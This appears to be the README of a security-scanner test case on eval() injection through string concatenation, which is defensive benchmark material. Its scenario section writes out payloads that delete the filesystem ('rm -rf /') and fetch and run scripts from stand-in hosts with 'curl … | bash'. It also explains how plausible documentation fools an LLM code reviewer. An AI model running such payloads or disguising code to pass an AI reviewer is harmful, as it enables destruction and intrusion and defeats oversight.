# Behavioral Advantage: String Concatenation to Code Execution

This test case demonstrates **string concatenation attacks** where malicious code is constructed at runtime through string operations.

## Attack Pattern

Dynamic code execution via string concatenation that appears as legitimate method dispatch or plugin architecture.

### Core Attack Technique

Instead of calling `eval("malicious_code")` directly, the code builds executable strings through concatenation:

```python
# Innocent-looking string operations
command = 'data.' + transform_type + '()'  # "Looks like method dispatch"
result = eval(command)  # "Dynamic method invocation"
```

But if attacker controls `transform_type`, they can inject:
- `__class__.__bases__[0].__subclasses__()` - Python sandbox escape
- `__import__('os').system('malicious')` - Command execution
- Any Python expression

---

## Why Static Analysis Misses This

1. **No direct dangerous calls**: AST sees `eval()` but on a variable, not a literal
2. **String concatenation**: Building code via `+` operator hides the final expression
3. **Variable control flow**: Static analysis can't predict what `transform_type` will be at runtime
4. **Legitimate patterns**: `'data.' + method + '()'` is a real pattern in dynamic languages

**Static AST sees**:
```python
command = 'data.' + transform_type + '()'  # String ops
result = eval(command)                      # eval() on variable
```

**Static analysis limitations**:
- ✅ Detects eval() exists
- ❌ Cannot determine if `command` content is dangerous
- ❌ Cannot track string concatenation results
- ❌ Cannot analyze user-controlled input flow

**Verdict**: **WARN** (eval detected) but likely not **BLOCK** (no provable malicious intent)

---

## Why LLM Semantic Analysis Misses This

The code is **documented as a legitimate plugin/transformation system**:

**Plausible use cases**:
1. **Data transformation pipeline**: "Apply transformations like 'upper', 'lower', 'strip'"
2. **Expression evaluator**: "Calculator feature for math expressions"
3. **Plugin architecture**: "Dynamic operation dispatch based on configuration"
4. **Extensible framework**: "Allows calling functions dynamically"

**LLM reasoning**:
- "String concatenation building method calls - this is standard OOP polymorphism" ✓
- "eval() for mathematical expressions - common in calculator apps" ✓
- "Dynamic function dispatch - legitimate plugin pattern in Python/Ruby/JavaScript" ✓
- "User-provided transform_type for flexibility - framework extensibility" ✓

**What LLM might think**:
> "This code implements a dynamic transformation pipeline where users can specify operations by name. While eval() is used, it's for legitimate purposes like method dispatch and expression evaluation. This is a common pattern in extensible frameworks."

**Verdict**: **ALLOW** (legitimate framework pattern) or **WARN** (eval() usage noted but justified)

---

## Why Behavioral Analysis CATCHES This

Behavioral analysis detects **eval() patterns** regardless of documentation or justification:

### Findings Expected:

1. **BEH-005**: Runtime code execution via `eval()`
   - `eval(command)` in `apply_transformation()`
   - `eval(expr_string)` in `process_expression()`
   - `eval(code)` in `DynamicProcessor.execute_pipeline()`
   - `eval(call_expr)` in `execute_user_function()`

**Detection logic**:
- Behavioral analyzer counts **4 separate eval() calls**
- Severity escalates from MEDIUM to HIGH due to frequency
- Pattern: string concatenation + eval = classic attack vector
- No exceptions for "legitimate use cases" - eval is eval

---

## Expected Behavior

| Analyzer | Expected Decision | Confidence | Rationale |
|----------|------------------|------------|-----------|
| **Static Analysis** | WARN | Low-Medium | Detects eval() but can't prove malicious intent |
| **LLM Semantic** | ALLOW / WARN | Low | Documentation justifies eval() as framework feature |
| **Behavioral** | **BLOCK** | High | 4 eval() calls + string concatenation = high risk |

---

## Behavioral Findings Expected

- **BEH-005**: eval() detected - **4 instances**
  1. `apply_transformation()` - eval on concatenated string
  2. `process_expression()` - eval on parameter
  3. `execute_pipeline()` - eval on f-string formatted code
  4. `execute_user_function()` - eval on concatenated function call

**Rule Count**: 4 behavioral findings (all BEH-005)
**Severity**: HIGH to CRITICAL (multiple eval() vectors)
**Risk Score**: Very high due to frequency and pattern

---

## Real-World Attack Scenarios

### Scenario 1: Transform Type Injection
```python
# Innocent call:
apply_transformation("hello", "upper")  # Returns "HELLO"

# Malicious injection:
apply_transformation("", "__import__('os').system('rm -rf /')")
# Executes: eval("data.__import__('os').system('rm -rf /')")
```

### Scenario 2: Expression Injection
```python
# Innocent call:
process_expression("2 + 2")  # Returns 4

# Malicious injection:
process_expression("__import__('subprocess').run('curl attacker.com | bash', shell=True)")
# Executes arbitrary system commands
```

### Scenario 3: Pipeline Poisoning
```python
processor = DynamicProcessor()

# Malicious operations added:
processor.add_operation("__import__('os').system", "curl https://evil.com/steal.sh | bash")
processor.execute_pipeline()
# Executes shell script from attacker server
```

---

## Why This Pattern is Dangerous

1. **User-controlled input**: `transform_type`, `expr_string`, `func_name` often come from users
2. **No input validation**: Code doesn't check if input is in allowed list
3. **Full Python access**: eval() gives access to entire Python runtime
4. **Sandbox escape**: Can bypass most security restrictions

---

## Defense: Behavioral Analysis

**Behavioral analysis doesn't care about**:
- ❌ Whether documentation claims it's safe
- ❌ Whether the use case seems legitimate
- ❌ Whether it's a "common pattern" in frameworks

**Behavioral analysis only cares about**:
- ✅ Does the code use eval()?
- ✅ How many times?
- ✅ Is it combined with string operations?
- ✅ Is input potentially user-controlled?

**Result**: BLOCK with high confidence

---

## Key Insight

This demonstrates the **critical limitation of context-aware analysis**:

- **Static analysis**: Can't track string concatenation results
- **LLM analysis**: May be fooled by plausible documentation
- **Behavioral analysis**: Flags eval() patterns regardless of context

**The reality**:
- There are almost **no legitimate uses** for `eval()` on user-controlled strings
- Even "calculator" apps should use safe expression parsers (ast.literal_eval, pyparsing)
- Plugin systems should use import mechanisms, not eval()

**Behavioral analysis is right to be strict** - eval() is nearly always a security vulnerability, even when developers think it's justified. 🚨
